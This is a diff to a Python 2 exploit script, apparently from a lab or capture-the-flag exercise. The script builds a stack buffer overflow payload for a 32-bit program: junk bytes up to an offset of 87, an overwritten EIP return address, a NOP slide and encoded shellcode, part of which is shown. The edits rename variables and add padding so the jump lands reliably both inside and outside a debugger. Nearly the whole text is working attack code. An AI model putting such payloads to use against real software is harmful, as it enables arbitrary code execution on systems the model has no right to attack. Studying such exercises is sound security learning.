@@ -1,8 +1,11 @@
 import struct
 
-eip_addr_1 = 0xbffff2b0
-eip_addr_2 = 0xbffff310
+
 eip_input_offset = 87
+eip_addr_gdb = 0xbffff2b0
+eip_addr_non_gdb = 0xbffff310
+target_address_extra_padding = 200
+nop_slide_extra_padding = 2 * target_address_extra_padding
 
 
 ## Junk
@@ -10,13 +13,13 @@ junk = "A" * eip_input_offset
 
 
 ## EIP
-target_addr = max(eip_addr_1, eip_addr_2) + 4
-eip_value = struct.pack("<I", target_addr)
+target_address = max(eip_addr_gdb, eip_addr_non_gdb) + 4 + target_address_extra_padding
+eip_value = struct.pack("<I", target_address)
 
 
 ## NOP slide
-slide_len = abs(eip_addr_1 - eip_addr_2)
-NOP = "\x90" * slide_len
+slide_len = abs(eip_addr_gdb - eip_addr_non_gdb) + nop_slide_extra_padding
+nop_slide = "\x90" * slide_len
 
 
 ## Shellcode
@@ -35,5 +38,6 @@ buf += "\xd6\x64\xa5\xe9\xef\xab\x14\x6f\x91\x8e\xc8\x70\x72"
 buf += "\x73\x74\xce\x77\x77\x78\x79\xb7\xfb"
 
 
-payload = junk + eip_value + NOP + buf
+payload = junk + eip_value + nop_slide + buf
 print payload
+
